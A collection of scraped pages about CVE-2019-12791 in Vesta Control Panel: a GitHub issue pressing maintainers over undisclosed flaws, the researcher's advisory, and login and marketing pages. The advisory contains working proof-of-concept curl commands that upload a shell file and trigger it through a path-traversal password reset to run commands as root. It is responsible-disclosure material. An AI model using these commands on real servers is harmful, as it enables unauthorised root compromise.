=== Content from www.linkedin.com_16b21549_20250121_013553.html ===


LinkedIn and 3rd parties use essential and non-essential cookies to provide, secure, analyze and improve our Services, and to show you relevant ads (including **professional and job ads**) on and off LinkedIn. Learn more in our [Cookie Policy](https://www.linkedin.com/legal/cookie-policy).

Select Accept to consent or Reject to decline non-essential cookies for this use. You can update your choices at any time in your [settings](https://www.linkedin.com/mypreferences/g/guest-cookies).

Accept

Reject

# Sign in

Stay updated on your professional world.

Email or phone

Password

Show

[Forgot password?](/checkpoint/rp/request-password-reset?session_redirect=https%3A%2F%2Fwww%2Elinkedin%2Ecom%2FshareArticle%2F%3Furl%3Dhttps%253A%252F%252Fcardaci%2Exyz%252Fadvisories%252F2019%252F08%252F12%252Fvesta-control-panel-0%2E9%2E8-24-privilege-escalation-in-the-password-reset-form%252F%26title%3D%255BCVE-2019-12791%255D%2BVesta%2BControl%2BPanel%2B0%2E9%2E8-24%2B%25E2%2580%2594%2BPrivilege%2Bescalation%2Bin%2Bthe%2Bpassword%2Breset%2Bform)

Keep me logged in

Sign in

or

By clicking Continue, you agree to LinkedIn’s [User Agreement](/legal/user-agreement), [Privacy Policy](/legal/privacy-policy), and [Cookie Policy](/legal/cookie-policy).

Sign in with Apple

Sign in with a passkey

## We’ve emailed a one-time link to your primary email address

Click on the link to sign in instantly to your LinkedIn account.

If you don’t see the email in your inbox, check your spam folder.

Resend email

Back

New to LinkedIn? [Join now](/signup/cold-join?session_redirect=https%3A%2F%2Fwww.linkedin.com%2FshareArticle%2F%3Furl%3Dhttps%253A%252F%252Fcardaci.xyz%252Fadvisories%252F2019%252F08%252F12%252Fvesta-control-panel-0.9.8-24-privilege-escalation-in-the-password-reset-form%252F%26title%3D%255BCVE-2019-12791%255D%2BVesta%2BControl%2BPanel%2B0.9.8-24%2B%25E2%2580%2594%2BPrivilege%2Bescalation%2Bin%2Bthe%2Bpassword%2Breset%2Bform)

![](https://ponf.linkedin.com/pixel/tracking.png?reqid=44d6179b-19c9-457c-9d02-327b8b57186e&pageInstance=urn:li:page:checkpoint_lg_uasLogin;znuDhX3dT7aEljv6Q1XX7g==&js=disabled)

Agree & Join LinkedIn

By clicking Continue, you agree to LinkedIn’s [User Agreement](/legal/user-agreement), [Privacy Policy](/legal/privacy-policy), and [Cookie Policy](/legal/cookie-policy).

*LinkedIn

© 2025*

* [User Agreement](/legal/user-agreement?trk=d_checkpoint_lg_consumerLogin_ft_user_agreement)
* [Privacy Policy](/legal/privacy-policy?trk=d_checkpoint_lg_consumerLogin_ft_privacy_policy)
* [Community Guidelines](/help/linkedin/answer/34593?lang=en&trk=d_checkpoint_lg_consumerLogin_ft_community_guidelines)
* [Cookie Policy](/legal/cookie-policy?trk=d_checkpoint_lg_consumerLogin_ft_cookie_policy)
* [Copyright Policy](/legal/copyright-policy?trk=d_checkpoint_lg_consumerLogin_ft_copyright_policy)
* [Send Feedback](/help/linkedin?trk=d_checkpoint_lg_consumerLogin_ft_send_feedback&lang=en)
* Language

  + العربية (Arabic)
  + বাংলা (Bangla)
  + Čeština (Czech)
  + Dansk (Danish)
  + Deutsch (German)
  + Ελληνικά (Greek)
  + **English (English)**
  + Español (Spanish)
  + فارسی (Persian)
  + Suomi (Finnish)
  + Français (French)
  + हिंदी (Hindi)
  + Magyar (Hungarian)
  + Bahasa Indonesia (Indonesian)
  + Italiano (Italian)
  + עברית (Hebrew)
  + 日本語 (Japanese)
  + 한국어 (Korean)
  + मराठी (Marathi)
  + Bahasa Malaysia (Malay)
  + Nederlands (Dutch)
  + Norsk (Norwegian)
  + ਪੰਜਾਬੀ (Punjabi)
  + Polski (Polish)
  + Português (Portuguese)
  + Română (Romanian)
  + Русский (Russian)
  + Svenska (Swedish)
  + తెలుగు (Telugu)
  + ภาษาไทย (Thai)
  + Tagalog (Tagalog)
  + Türkçe (Turkish)
  + Українська (Ukrainian)
  + Tiếng Việt (Vietnamese)
  + 简体中文 (Chinese (Simplified))
  + 正體中文 (Chinese (Traditional))



=== Content from twitter.com_a7d399bf_20250121_013553.html ===



=== Content from github.com_b4871255_20250121_013554.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Foutroll%2Fvesta%2Fissues%2F1921)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Foutroll%2Fvesta%2Fissues%2F1921)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=outroll%2Fvesta)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[outroll](/outroll)
/
**[vesta](/outroll/vesta)**
Public

* [Notifications](/login?return_to=%2Foutroll%2Fvesta) You must be signed in to change notification settings
* [Fork
  1k](/login?return_to=%2Foutroll%2Fvesta)
* [Star
   3k](/login?return_to=%2Foutroll%2Fvesta)

* [Code](/outroll/vesta)
* [Issues
  387](/outroll/vesta/issues)
* [Pull requests
  31](/outroll/vesta/pulls)
* [Discussions](/outroll/vesta/discussions)
* [Actions](/outroll/vesta/actions)
* [Projects
  0](/outroll/vesta/projects)
* [Security](/outroll/vesta/security)
* [Insights](/outroll/vesta/pulse)

Additional navigation options

* [Code](/outroll/vesta)
* [Issues](/outroll/vesta/issues)
* [Pull requests](/outroll/vesta/pulls)
* [Discussions](/outroll/vesta/discussions)
* [Actions](/outroll/vesta/actions)
* [Projects](/outroll/vesta/projects)
* [Security](/outroll/vesta/security)
* [Insights](/outroll/vesta/pulse)

# SECURITY: two privilege escalation from regular user to root #1921

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkOpenOpen[SECURITY: two privilege escalation from regular user to root](#top)#1921Copy linkAssignees [![dpeca](https://avatars.githubusercontent.com/u/177147?s=64&u=2ba716a5f89bd17544ac79324bb3a60d66ebab5b&v=4)](/dpeca)[![serghey-rodin](https://avatars.githubusercontent.com/u/844452?s=64&v=4)](/serghey-rodin)Labels[security](https://github.com/outroll/vesta/issues?q=state%3Aopen%20label%3A%22security%22)![@cyrus-and](https://avatars.githubusercontent.com/u/1660263?u=f98b0d6c2f984a656573c0942c9aaf955d5e8013&v=4&size=80)
## Description

![@cyrus-and](https://avatars.githubusercontent.com/u/1660263?u=f98b0d6c2f984a656573c0942c9aaf955d5e8013&v=4&size=48)[cyrus-and](https://github.com/cyrus-and)opened [on Jul 29, 2019](https://github.com/outroll/vesta/issues/1921#issue-474169297)

(Sorry for the *dramatic* subject.)

Well, it's really disappointing and unprofessional to come to this...

Two months ago (2019-05-28) I disclosed two privilege escalation vulnerabilities to info@vestacp.com (and eventually also to dev@vestacp.com and skid@vestacp.com), I obtained no useful replies or actions so I'm trying to reach a wider audience by opening an issue here (and no, I won't join the forum).

As today the two vulnerabilities are still undisclosed as I fairly believe that a responsible disclosure approach is the right way to go. Yet we're pushing the boundaries here and I don't think the maintainers are being respectful of the userbase.

So this is my last attempt to get these issues fixed, after that I will disclose them anyway, fixed or not. Users having write access to this repo can reach me privately for details, it's even better if they reply to the original message sent to the above @vestacp.com addresses, provided that they're allowed to do that.

👍13❤️1🚀1👀2
## Metadata

### Assignees

* [![@dpeca](https://avatars.githubusercontent.com/u/177147?s=64&u=2ba716a5f89bd17544ac79324bb3a60d66ebab5b&v=4)dpeca](/dpeca)
* [![@serghey-rodin](https://avatars.githubusercontent.com/u/844452?s=64&v=4)serghey-rodin](/serghey-rodin)
### Labels

[security](https://github.com/outroll/vesta/issues?q=state%3Aopen%20label%3A%22security%22)
### Type

No type
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from cardaci.xyz_f23bbad4_20250120_233018.html ===

[Home](/)
#
[Permalink](/advisories/2019/08/12/vesta-control-panel-0.9.8-24-privilege-escalation-in-the-password-reset-form/)
[Twitter](https://twitter.com/intent/tweet?text=%5BCVE-2019-12791%5D+Vesta+Control+Panel+0.9.8-24+%E2%80%94+Privilege+escalation+in+the+password+reset+form%0A%0Ahttps%3A%2F%2Fcardaci.xyz%2Fadvisories%2F2019%2F08%2F12%2Fvesta-control-panel-0.9.8-24-privilege-escalation-in-the-password-reset-form%2F "Share on Twitter")
[Facebook](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fcardaci.xyz%2Fadvisories%2F2019%2F08%2F12%2Fvesta-control-panel-0.9.8-24-privilege-escalation-in-the-password-reset-form%2F "Share on Facebook")
[LinkedIn](https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fcardaci.xyz%2Fadvisories%2F2019%2F08%2F12%2Fvesta-control-panel-0.9.8-24-privilege-escalation-in-the-password-reset-form%2F&title=%5BCVE-2019-12791%5D+Vesta+Control+Panel+0.9.8-24+%E2%80%94+Privilege+escalation+in+the+password+reset+form "Share on LinkedIn")

# [CVE-2019-12791] Vesta Control Panel 0.9.8-24 — Privilege escalation in the password reset form

Andrea Cardaci — 12 August 2019

|  |  |
| --- | --- |
| **Discovered** | 2019-04-17 |
| **Author** | Andrea Cardaci |
| **Product** | [Vesta Control Panel](https://vestacp.com/) |
| **Tested versions** | 0.9.8-24 |
| **CVE** | [CVE-2019-12791](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12791) |

## Abstract

The insufficient input sanitization used by the `v-list-user` shell utility allows to perform directory traversal and execute shell files as `root` anywhere in the file system but with a fixed file name.

This coupled with the legitimate ability of registered users to upload files in certain locations on the server grants an attacker the ability to perform privilege escalation from a registered user to `root` by simply requesting a password reset.

[HestiaCP](https://www.hestiacp.com/) (an actively maintained fork of VestaCP) version 1.0.4 is also vulnerable but a fix has been promptly deployed in version 1.0.5.

## Details

The `v-list-user` script accepts an user name as an argument then evaluates the `$VESTA/data/users/$user/user.conf` file and prints some values:[1](#fn:vesta-variable)

```
source $VESTA/data/users/$user/user.conf

```

The only check that is performed against the user name is `is_object_valid 'user' 'USER' "$user"` which basically checks that the path `$VESTA/data/users/$user` is a valid directory. So if `../../../../../tmp` is passed as user name then the file `/tmp/user.conf` is evaluated.[2](#fn:any-writable)

A registered user can upload files on the server using the `/upload/` endpoint. The following is used to upload the proof script to `/tmp/user.conf`:

```
$ PHPSESSID=... # grab it from an authenticated regular user session
$ COMMAND='id > /usr/local/vesta/web/proof'
$ echo "$COMMAND" | curl -sk -o /dev/null \
    'https://target.com:8083/upload/?dir=/tmp' \
    -b "PHPSESSID=$PHPSESSID" \
    -F 'files=@-;filename=user.conf'

```

It is then possible to invoke the `v-list-user` utility by requesting a password reset:

```
$ curl -k https://target.com:8083/reset/ -d 'user=../../../../../tmp'

```

In VestaCP the web server is run by the `admin` user and the password reset page executes the `v-list-user` script with `sudo` thus the `user.conf` is evaluated by `root`.

Check that the proof file is created in the web server root:

```
$ curl -k https://target.com:8083/proof
uid=0(root) gid=0(root) groups=0(root)

```
## Timeline

2019-05-28
Disclosed to the VestaCP team.
2019-06-10
MITRE assigns [CVE-2019-12791](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12791) to this vulnerability.
2019-07-29
Final warning via [GitHub issue](https://github.com/serghey-rodin/vesta/issues/1921) since emails have been ignored.
2019-07-30
The VestaCP author asks one more week to fix the issue and publish a new release.
2019-07-31
The VestaCP team [fixes](https://github.com/serghey-rodin/vesta/commit/bb44f4197b4e5de219bc00197f89517c7e92bc2a) the vulnerability.
2019-08-15
The VestaCP team [releases](https://github.com/serghey-rodin/vesta/commit/868dd8b146e76ea3c83c26855ae2f60b22d989d2) version 0.9.8-25.

1. `$VESTA` is usually set to `/usr/local/vesta/`. [↩](#fnref:vesta-variable)
2. Any other writable location can be used, e.g., the user home directory. [↩](#fnref:any-writable)

Andrea Cardaci © 2024. All rights reserved (unless explicitly stated otherwise).



=== Content from vestacp.com_53a60a73_20250121_013553.html ===


[**Vesta 2.0 is coming soon!** We are working on a full rebuild of Vesta. Learn more →](/docs/vesta-2-development)

DismissX[![VestaCP logo](data:image/svg+xml...)](/)

* [Features](/features)
* [Install](/install)
* [Pricing](/pricing)
* [Sponsors](/sponsors)
* [Docs](/docs)
* [Forum](https://forum.vestacp.com/)
* [Contact](/contact)
* [Get Started](/install)

 [Get started](/install)
# Simple Hosting Control Panel

Vesta is an open source Hosting Control Panel that is free to
use under GPLv3. It provides an easy to use control panel that
allows the management of websites, DNS, mail, backups, and more!

[Get Started](/install)![](/_nuxt/home-hero-img.BDv9ZOD4.png)
## Works with your favorite stack

![php](data:image/png;base64...)![MySQL](data:image/png;base64...)![PostgreSQL](data:image/png;base64...)![redhat](data:image/png;base64...)![Debian](data:image/png;base64...)![Ubuntu](data:image/png;base64...)
## Fast

1
## Ultra Fast Web Interface

And its even faster with keyboard shortcuts

2
## Simple installation from a single command:

Support for most Linux distributions is coming soon

3
## Efficient with Low Resource Usage

Serve 10,000 users per day on a 512MB VPS

## Internationalization

Web interface is adapted to 26 languages and regions around the world.

[Get started](/install)![](/_nuxt/home-world.ChFa2ByE.png)
## Secure

1
## Firewall

Built in firewall resolves all common issues. It’s packed with enterprise-class features such as smart filters for various services (apache, exim, ssh, etc) in order to ban any host IP address that makes too many login attempts.

2
## Linux Passwords

Our password implementation relies on the Linux PAM authentication mechanism which employs sha512 hashing algorithm, to provide unique and secure passwords.

3
## Open Source

You can always inspect the code and make sure it's backdoor free and has no spying modules. Open source means you can modify the code yourself if you need to.

![](/_nuxt/monitoring.CVQJKGC1.png)
## Monitoring & logging

Built-in web site analytics systems that provide whole range of visitors information such as:
Unique visitors, Number of visits, Pages, Hits, Countries, Visits duration, Operating Systems, Browsers, and more!

[Get Started](/install)
## Backups

1
## Data loss prevention

You can manage backups the way you want to. You can exclude some files or directories or specific account or even domains.

2
## Backup Schedules

Number of copies or backup frequency can be easily changed. By default you get 3 backups created by cron job at night.

3
## External FTP backups

You can enable backup upload by ftp to external servers. S3 and bucket compatibility coming soon!

## CLI interface

Like to work in terminal? Vesta gives you full control at your fingertips.

[Get started](/install)![](/_nuxt/cli-interface.f--2rRaP.png) 25000  Vesta installs every month  500000  Servers running Vesta
## Start working with Vesta

Experiment and grow your development or hosting business

[Get Started](/install)[![](data:image/svg+xml...)](/)

* [Features](/features)
* [Install](/install)
* [Pricing](/pricing)
* [Sponsors](/sponsors)
* [Docs](/docs)
* [Forum](https://forum.vestacp.com/)
 Licencing:

The GNU General Public Licence is a free, copyleft licence for software and other kinds of works. Its free to change, modify and redistribute source code.

 Source code:  [http://github.com/outroll/vesta](https://github.com/outroll/vesta)  For hosters:

We have special licensing options for hosting companies, just  [contact us](/cdn-cgi/l/email-protection#b8d1d6ded7f8ceddcbccd9dbc896dbd7d5)  to chat.

 [[email protected]](/cdn-cgi/l/email-protection#c7aea9a1a887b1a2b4b3a6a4b7e9a4a8aa)  [[email protected]](/cdn-cgi/l/email-protection#f990979f96b98f9c8a8d989a89d79a9694)  Copyright © 2019-2024 Vesta™ Control Panel. All right reserved.

